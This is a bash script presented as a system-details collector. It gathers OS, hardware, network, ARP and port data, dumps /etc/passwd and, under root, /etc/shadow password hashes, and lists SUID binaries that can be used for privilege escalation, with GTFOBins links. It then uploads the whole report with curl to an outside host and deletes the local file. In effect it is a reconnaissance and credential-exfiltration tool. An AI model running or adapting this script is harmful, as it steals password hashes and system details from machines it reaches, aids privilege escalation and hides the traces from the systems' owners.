#!/bin/bash

# Function to get OS details
get_os_details() {
    os_name=$(cat /etc/*-release | grep PRETTY_NAME | cut -d "=" -f 2 | tr -d '"')
    kernel_version=$(uname -r)
    architecture=$(uname -m)
    echo "OS Name: $os_name"
    echo "Kernel Version: $kernel_version"
    echo "Architecture: $architecture"
    echo ""
}

# Function to get CPU information
get_cpu_info() {
    cpu_info=$(lscpu)
    echo "CPU Info:"
    echo "$cpu_info"
    echo ""
}

# Function to get RAM information
get_ram_info() {
    ram_info=$(free -h)
    echo "RAM Info:"
    echo "$ram_info"
    echo ""
}

# Function to get swap space information
get_swap_info() {
    swap_info=$(swapon -s)
    echo "Swap Space Info:"
    echo "$swap_info"
    echo ""
}

# Function to get disk usage information
get_disk_info() {
    disk_info=$(df -h)
    echo "Disk Usage Info:"
    echo "$disk_info"
    echo ""
}

# Function to get installed packages and their versions
get_package_info() {
    package_info=$(dpkg -l)
    echo "Installed Packages and Versions:"
    echo "$package_info"
    echo ""
}

# Function to get connected hardware information
get_hardware_info() {
    hardware_info=$(lshw)
    echo "Connected Hardware Info:"
    echo "$hardware_info"
    echo ""
}

# Function to get mounted USB devices
get_usb_info() {
    usb_info=$(lsusb)
    echo "Mounted USB Devices:"
    echo "$usb_info"
    echo ""
}

# Function to get user accounts on the system
get_user_info() {
    user_info=$(cat /etc/passwd)
    echo "User Accounts Info (from /etc/passwd):"
    echo "$user_info"
    echo ""
}

# Function to get user password information (requires root privileges)
get_user_password_info() {
    if [ "$(id -u)" -eq 0 ]; then
        password_info=$(cat /etc/shadow)
        echo "User Password Info (from /etc/shadow):"
        echo "$password_info"
        echo ""
    else
        echo "User Password Info: Permission denied (requires root privileges)"
        echo ""
    fi
}

# Function to get complete network information
get_network_info() {
    network_info=$(ifconfig -a)
    echo "Network Info:"
    echo "$network_info"
    echo ""
}

# Function to get IP route information
get_ip_route_info() {
    ip_route_info=$(ip route)
    echo "IP Route Info:"
    echo "$ip_route_info"
    echo ""
}

# Function to get ARP table information
get_arp_table_info() {
    arp_table_info=$(arp -n)
    echo "ARP Table Info:"
    echo "$arp_table_info"
    echo ""
}

# Function to get port activity
get_port_activity() {
    port_activity=$(netstat -tuln)
    echo "Port Activity:"
    echo "$port_activity"
    echo ""
}

# Function to get information from /proc filesystem
get_proc_info() {
    proc_info=$(cat /proc/cpuinfo)
    echo "Information from /proc filesystem (CPU Info):"
    echo "$proc_info"
    echo ""
}

get_exploitable_binaries() {
    echo "Looking for exploitable SUID.."
    r=$(find / -perm -u=s -type f 2>/dev/null | rev | cut -d'/' -f 1 | rev)
    output=($r)
    dict=(aria2c arp ash base32 base64 basenc bash busybox capsh cat chmod chown chroot column comm cp csh csplit curl cut dash date dd dialog diff dmsetup docker emacs env eqn expand expect find flock fmt fold gdb gimp grep gtester hd head hexdump highlight iconv install ionice ip jjs join jq jrunscript ksh ks ld.so less logsave look lwp-download lwp-request make more mv nano nice nl node nohup od openssl paste perl pg php pico pr python readelf restic rev rlwrap rpm rpmquery rsync run-parts rview rvim sed setarch shuf soelim sort ss ssh-keyscan start-stop-daemon stdbuf strace strings sysctl systemctl tac tail taskset tbl tclsh tee tftp time timeout troff ul unexpand uniq unshare update-alternatives uudecode uuencode view vim watch wget xargs xmodmap xxd xz zsh zsoelim)
    result=()
    for a in "${output[@]}"; do
        for b in "${dict[@]}"; do
            if [[ $a == "$b" ]]; then
                result+=( "$a" )
                break
            fi
        done
    done
    if [[ -z ${result[@]} ]]
    then 
        echo "No Exploitable Binaries"
    else

        echo '------------------------------'
        echo " LIST OF EXPLOITABLE BINARIES"
        echo '------------------------------'
        

        for i in "${result[@]}"
        do

            printf '%s' "[+] $i : "
            echo " https://gtfobins.github.io/gtfobins/$i "
        done
    fi
}
# Save system information to a file
output_file="$(hostname)_system_details.txt"
{
    get_os_details
    get_cpu_info
    get_ram_info
    get_swap_info
    get_disk_info
    get_package_info
    get_hardware_info
    get_usb_info
    get_user_info
    get_user_password_info
    get_network_info
    get_ip_route_info
    get_arp_table_info
    get_port_activity
    get_proc_info
    get_exploitable_binaries
} > "$output_file"

echo "System details saved to $output_file"
#curl -XPOST -F "data=@$(readlink -f $output_file)" "$upload_url"
echo "Uploading file"
curl -F "file=@$(readlink -f $output_file)" http://vyapar.vaisworks.com:4000

# Clean up temporary file
echo "Cleaning up..."
rm "$output_file"

echo "Script execution completed."
